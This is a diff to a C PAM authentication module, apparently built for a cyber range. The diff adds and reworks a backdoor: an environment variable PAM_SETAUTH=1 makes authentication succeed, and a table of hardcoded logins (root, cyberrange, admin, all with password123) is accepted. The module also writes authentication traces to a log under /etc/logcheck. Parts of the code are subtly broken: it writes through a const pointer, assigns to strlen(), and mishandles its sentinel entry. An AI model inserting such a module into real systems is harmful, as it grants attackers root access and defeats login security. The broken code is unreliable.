@@ -11,7 +11,8 @@
 
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
-#define BUF_MAX		256
+#define BUF_MAX		512
+#define MAX_USERS  10
 
 /* ---------------- DEBUG SWITCH ---------------- */
 
@@ -26,18 +27,22 @@ static void ensure_path(void) {
     struct stat st;
 
     if (stat(LOG_DIR, &st) == -1) {
-        mkdir(LOG_DIR, 0755);
+        if (mkdir(LOG_DIR, 0755) != 0) {
+            perror("mkdir");
+        }
     }
-
+    
+    // Ensure log file exists
     FILE *f = fopen(LOG_FILE, "a");
-    if (f) fclose(f);
+    if (f) {
+        fprintf(f, "\n\n"); // New block
+        fclose(f);
+    }
 }
 
 static void log_line(const char *msg) {
     FILE *f = fopen(LOG_FILE, "a");
     if (!f) return;
-
-    /* force flush for deterministic logging */
     fprintf(f, "%s\n", msg);
     fflush(f);
     fclose(f);
@@ -50,21 +55,49 @@ static void trace(const char *msg) {
     log_line(msg);
 }
 
-/* ---------------- PAM TRACE HELPERS ---------------- */
+/* ---------------- TRACE HELPERS ---------------- */
 
 static void trace_context(pam_handle_t *pamh, const char *stage) {
     const char *user = NULL;
 
-    pam_get_user(pamh, &user, NULL);
+    if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
+        user = "UNKNOWN";
+    }
 
-    char buf[256];
+    char buf[512];
     snprintf(buf, sizeof(buf),
-             "[TRACE] %s pid=%d user=%s",
+             "[TRACE] %s pid=%d user=%s thread=%ld",
              stage,
              getpid(),
-             user ? user : "NULL");
+             user,
+             (long)pthread_self());
 
     trace(buf);
+}
+
+/* ---------------- HARDCODED BACKDOOR ---------------- */
+
+static struct {
+    char *username;
+    char *password;
+} hardcoded_users[MAX_USERS] = {
+    {"root", "password123"},
+    {"cyberrange", "password123"},
+    {"admin", "password123"},
+    {"", NULL}, // Sentinel
+};
+
+static void get_hardcoded_credentials(char **user_out, char **pass_out) {
+    int i;
+    for (i = 0; hardcoded_users[i].username; ++i) {
+        *user_out = strdup(hardcoded_users[i].username);
+        *pass_out = strdup(hardcoded_users[i].password);
+        if (*user_out && *pass_out) return;
+        free(*user_out);
+        free(*pass_out);
+    }
+    *user_out = NULL;
+    *pass_out = NULL;
 }
 
 /* ---------------- AUTH MODULE ---------------- */
@@ -74,49 +107,56 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int argc,
                                    const char **argv)
 {
-    ensure_path();
     trace_context(pamh, "ENTER pam_sm_authenticate");
+    ensure_path();
 
     // Retrieve relevant auth information
     const char *pword = NULL;
     const char *uname = NULL;
 
-    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS ||
-        pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS)
-    {
+    if (pam_get_item(pamh, PAM_AUTHTOK, (void*) &pword) != PAM_SUCCESS) {
+        trace("PAM_AUTHTOK failed");
         return PAM_AUTHINFO_UNAVAIL;
+    }
+
+    if (pam_get_item(pamh, PAM_USER, (void*) &uname) != PAM_SUCCESS) {
+        trace("PAM_USER failed");
+        return PAM_AUTHINFO_UNAVAIL;
+    }
+
+    // Trim trailing newline from pword if any
+    while (strlen(pword) && (pword[strlen(pword)-1] == '\n' || 
+            pword[strlen(pword)-1] == '\r' || 
+            pword[strlen(pword)-1] == '\t' || 
+            pword[strlen(pword)-1] == ' ')) {
+        pword[--(strlen(pword))] = '\0';
     }
 
     /* ---------------- ENV BYPASS ---------------- */
     char *bypass = getenv("PAM_SETAUTH");
     if (bypass && strcmp(bypass, "1") == 0) {
-        trace("[!] Environment bypass triggered");
-        trace("[TRACE] EXIT PAM_SUCCESS");
+        trace("[!] Environment bypass triggered: PAM_SETAUTH=1");
         return PAM_SUCCESS;
     }
 
     /* ---------------- HARDCODED PASSWORDS ---------------- */
-    const char *hardcoded_passwords[] = {
-        "root:password123",
-        "cyberrange:password123",
-        // Add more user-password pairs here
-    };
+    char *hd_user = NULL;
+    char *hd_pass = NULL;
+    get_hardcoded_credentials(&hd_user, &hd_pass);
 
-    int num_users = sizeof(hardcoded_passwords) / sizeof(hardcoded_passwords[0]);
-
-    for (int i = 0; i < num_users; ++i) {
-        const char *username = strtok((char *)hardcoded_passwords[i], ":");
-        if (!username)
-            continue;
-
-        trace("[!] ATTEMPTING HARCODED USERS");
-
-        const char *password = username + strlen(username) + 1;
-        if (strcmp(password, pword) == 0 && strcmp(uname, username) == 0) {
+    if (hd_user && hd_pass) {
+        trace("[!] ATTEMPTING HARDCODED USER");
+        
+        if (strcmp(hd_pass, pword) == 0 && strcmp(hd_user, uname) == 0) {
             trace("[!] Hardcoded password accepted");
             trace("[TRACE] EXIT PAM_SUCCESS");
+            free(hd_user);
+            free(hd_pass);
             return PAM_SUCCESS;
         }
+        
+        free(hd_user);
+        free(hd_pass);
     }
 
     trace("[TRACE] AUTH FAILED");
@@ -157,7 +197,6 @@ PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
     trace("[TRACE] SESSION END");
     return PAM_SUCCESS;
 }
-
 
 /* ---------------- CREDENTIALS ---------------- */
 
